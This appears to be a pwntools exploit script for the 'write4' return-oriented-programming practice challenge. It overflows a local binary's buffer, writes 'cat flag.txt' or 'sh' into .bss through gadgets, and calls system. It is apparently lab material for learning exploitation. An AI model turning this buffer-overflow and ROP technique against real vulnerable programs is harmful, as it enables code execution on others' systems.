#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./write4")
sh = process("./write4")

system_plt = elf.plt["system"]
bss_addr = 0x00601060
pop_rdi = 0x00400893
pop_r14_r15 = 0x00400890
mov_r14_r15 = 0x00400820
cat_flag = ["cat flag",".txt".ljust(8,"\x00")]


payload = ""
payload += "A"*40

for i in xrange(0,2):
	payload += p64(pop_r14_r15)
	payload += p64(bss_addr + i * 8)
	payload += cat_flag[i]
	payload += p64(mov_r14_r15)
	
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()

'''
from pwn import *

elf = ELF("./write4")
sh = process("./write4")

system_plt = elf.plt["system"]

bss_addr = 0x00601060
pop_rdi = 0x00400893
pop_rsi_r15 = 0x00400891
mov_rsi_edi = 0x00400821

payload = ""
payload += "A"*40
payload += p64(pop_rsi_r15)
payload += p64(bss_addr)
payload += "AAAAAAAA"
payload += p64(pop_rdi)
payload += "sh\x00\x00\x00\x00\x00\x00"
payload += p64(mov_rsi_edi)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()

'''